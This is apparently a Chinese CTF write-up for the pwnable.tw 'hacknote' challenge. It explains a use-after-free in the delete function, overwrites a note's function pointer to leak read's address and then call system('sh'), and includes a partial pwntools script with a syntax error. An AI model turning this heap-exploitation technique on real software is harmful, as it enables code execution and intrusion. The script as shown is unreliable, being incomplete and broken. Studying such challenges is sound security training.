0x01 思路

main函数实现了create,delete,show三个功能

delete函数在free堆块的时候未将指针置零，因此存在UAF漏洞可以利用


#首先创建两个堆块 然后释放掉他们 这样fastbin 存在 chunk1 head -> chunk0 head
create(16,'AAAA') # idx 0 -> chunk0
create(16,'BBBB') # idx 1 -> chunk1
delete(0)
delete(1)


# create一个和head相同大小size的堆块 将chunk1 head 和 chunk0 head重新申请回来 可以获得一个指针 我们将这个指针修改为puts 然后后面放上read_got 就可以泄露read_addr
create(8,p32(puts)+p32(read_got)) # idx 2 = idx 0 -> chunk0 head -> puts(read_got)


# 重复刚刚的操作 将指针指向system 即可getshell
delete(2)
create(8,p32(system_addr) + ";sh\x00") # idx 3 = idx 0 -> chunk0 head -> system('sh')

from pwn import *

io = remote("chall.pwnable.tw", 10102)

elf = ELF("./hacknote")
libc = ELF("./libc_32.so.6")

read_got = elf.got["read"]
puts = 0x804862b

def create(size,index):
      io.recvuntil("choice :")
      io.sendline("1")
      io.recvuntil("size :")
      io.sendline(str(size)
      io.recvuntil("Content :")
      io.sendline(index)
 
def delete(index):
      io.recvuntil("choice :")
      io.sendline("2")
      io.recvuntil("Index :")
      io.sendline(str(index))

def show(index):
      io.recvuntil("choice :")
      io.sendline("3")
      io.recvuntil("Index :")
      io.sendline(str(index))
